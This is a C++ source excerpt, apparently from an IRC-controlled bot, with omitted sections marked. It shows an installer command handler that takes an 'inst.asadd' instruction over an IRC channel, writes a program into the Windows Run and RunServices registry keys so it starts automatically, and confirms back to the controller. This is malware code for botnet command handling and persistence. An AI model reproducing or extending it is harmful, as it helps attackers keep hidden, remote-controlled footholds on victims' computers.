bool CInstaller::HandleCommand(CMessage *pMsg) {
  /* ... OMITTED ... */
  if (!pMsg->sCmd.Compare("inst.asadd")) {
    CString sValue = pMsg->sChatString.Token(1, " ", true);
    CString sFile = pMsg->sChatString.Token(2, " ", true);
    if (RegStartAdd(sValue, sFile))
      g_pMainCtrl->m_cIRC.SendFormat(
          pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
          "Added registry autostart value \"%s\" as \"%s\".", sValue.CStr(),
          sFile.CStr());
    return true;
  }
  /* ... OMITTED ... */
}

bool CInstaller::RegStartAdd(CString &sValuename, CString &sFilename) {
  /* ... OMITTED ... */
  HKEY key;
  RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL,
                 REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
  RegSetValueEx(key, sValuename.CStr(), 0, REG_SZ,
                (LPBYTE)(const char *)sFilename.CStr(),
                (DWORD)strlen(sFilename));
  RegCloseKey(key);

  RegCreateKeyEx(HKEY_LOCAL_MACHINE,
                 "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0,
                 NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key,
                 NULL);
  RegSetValueEx(key, sValuename.CStr(), 0, REG_SZ,
                (LPBYTE)(const char *)sFilename.CStr(),
                (DWORD)strlen(sFilename));
  RegCloseKey(key);

  return true;
}
